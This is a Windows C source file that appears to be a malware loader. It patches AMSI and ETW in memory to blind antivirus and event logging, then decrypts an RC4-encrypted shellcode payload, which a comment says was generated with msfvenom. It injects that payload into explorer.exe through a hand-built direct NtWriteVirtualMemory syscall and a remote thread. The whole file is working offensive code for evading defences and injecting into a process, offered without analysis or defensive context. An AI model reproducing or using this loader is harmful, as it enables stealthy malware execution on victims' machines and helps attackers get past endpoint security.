#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <tlhelp32.h>   
#include <wchar.h>     
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>

typedef LONG NTSTATUS;
typedef NTSTATUS (NTAPI *pNtWriteVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID BaseAddress,
    PVOID Buffer,
    ULONG NumberOfBytesToWrite,
    PULONG NumberOfBytesWritten
);

unsigned char syscall_stub[] = {
    0x4C, 0x8B, 0xD1,               // mov r10, rcx
    0xB8, 0x3A, 0x00, 0x00, 0x00,   // mov eax, 0x3A   ; NtWriteVirtualMemory
    0x0F, 0x05,                     // syscall         ; kernel call
    0xC3                            // ret             ; back to caller
};

void disable_amsi() {
    HMODULE amsi = LoadLibraryA("amsi.dll");
    if (!amsi) return;
    void *addr = GetProcAddress(amsi, "AmsiScanBuffer");
    if (!addr) return;

    DWORD old;
    VirtualProtect(addr, 1, PAGE_EXECUTE_READWRITE, &old);
    *(BYTE*)addr = 0xC3;  // ret
    VirtualProtect(addr, 1, old, &old);
}

void disable_etw() {
    unsigned char patch[] = { 0xB8,0x00,0x00,0x00,0x00, 0xC3 };  // mov eax,0;ret
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    void *addr = GetProcAddress(ntdll, "EtwEventWrite");
    if (!addr) return;

    DWORD old;
    VirtualProtect(addr, sizeof(patch), PAGE_EXECUTE_READWRITE, &old);
    memcpy(addr, patch, sizeof(patch));
    VirtualProtect(addr, sizeof(patch), old, &old);
}

// RC4
void rc4_init(uint8_t *S, const uint8_t *key, size_t keylen) {
    for (int i = 0; i < 256; i++) S[i] = i;
    int j = 0;
    for (int i = 0; i < 256; i++) {
        j = (j + S[i] + key[i % keylen]) & 0xFF;
        uint8_t tmp = S[i]; S[i] = S[j]; S[j] = tmp;
    }
}
void rc4_crypt(uint8_t *S, uint8_t *data, size_t datalen) {
    int i = 0, j = 0;
    for (size_t k = 0; k < datalen; k++) {
        i = (i + 1) & 0xFF;
        j = (j + S[i]) & 0xFF;
        uint8_t tmp = S[i]; S[i] = S[j]; S[j] = tmp;
        uint8_t K = S[(S[i] + S[j]) & 0xFF];
        data[k] ^= K;
    }
}
// XOR 10i + RC4 encypted payload
// Generate with msfvenom
unsigned char encrypted[] = 
"\x98\x48\x18\xa9\xb7\x4a\x3c\x33\x28\xcb\xbb\x02\xab\xa3";  
size_t encrypted_len = sizeof(encrypted) - 1;

int main() {
    disable_etw();
    disable_amsi();

    // 1) Search PID explorer.exe
    DWORD explorerPid = 0;
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) {
        fprintf(stderr, "Snapshot failed: %lu\n", GetLastError());
        return 1;
    }
    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(pe);
    for (BOOL ok = Process32First(snap, &pe); ok; ok = Process32Next(snap, &pe)) {
        if (_stricmp(pe.szExeFile, "explorer.exe") == 0) {
            explorerPid = pe.th32ProcessID;
            break;
        }
    }
    CloseHandle(snap);
    if (!explorerPid) {
        fprintf(stderr, "No se encontró explorer.exe\n");
        return 1;
    }

    // 2) Open handle to explorer.exe
    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, explorerPid);
    if (!hProc) {
        fprintf(stderr, "OpenProcess failed (PID %lu): %lu\n", explorerPid, GetLastError());
        return 1;
    }

    // 3) Memory reserve and copy syscall stub
    void *stub_mem = VirtualAlloc(NULL, sizeof(syscall_stub),
                                  MEM_COMMIT|MEM_RESERVE,
                                  PAGE_EXECUTE_READWRITE);
    if (!stub_mem) {
        fprintf(stderr, "VirtualAlloc(stub) failed: %lu\n", GetLastError());
        CloseHandle(hProc);
        return 1;
    }
    memcpy(stub_mem, syscall_stub, sizeof(syscall_stub));
    pNtWriteVirtualMemory NtWVM = (pNtWriteVirtualMemory)stub_mem;

    // 4) Decrypt payload in-place
    uint8_t key[] = "UltraSecreta2025!";
    uint8_t S[256];
    rc4_init(S, key, strlen((char*)key));
    rc4_crypt(S, encrypted, encrypted_len);

    // 5) Memory reserve in explorer.exe
    LPVOID remoteMem = VirtualAllocEx(hProc, NULL, encrypted_len,
                                      MEM_COMMIT|MEM_RESERVE,
                                      PAGE_EXECUTE_READWRITE);
    if (!remoteMem) {
        fprintf(stderr, "VirtualAllocEx failed: %lu\n", GetLastError());
        CloseHandle(hProc);
        return 1;
    }

    // 6) Inject with manually created syscall
    ULONG written = 0;
    NTSTATUS st = NtWVM(hProc, remoteMem, encrypted,
                        (ULONG)encrypted_len, &written);
    if (st != 0 || written != encrypted_len) {
        fprintf(stderr, "NtWriteVirtualMemory failed: 0x%lX (%u bytes)\n", st, written);
        CloseHandle(hProc);
        return 1;
    }

    // 7) Create remote thread in explorer.exe
    HANDLE hThread = CreateRemoteThread(hProc, NULL, 0,
                                        (LPTHREAD_START_ROUTINE)remoteMem,
                                        NULL, 0, NULL);
    if (!hThread) {
        fprintf(stderr, "CreateRemoteThread failed: %lu\n", GetLastError());
        CloseHandle(hProc);
        return 1;
    }

    CloseHandle(hThread);
    CloseHandle(hProc);
    return 0;
}
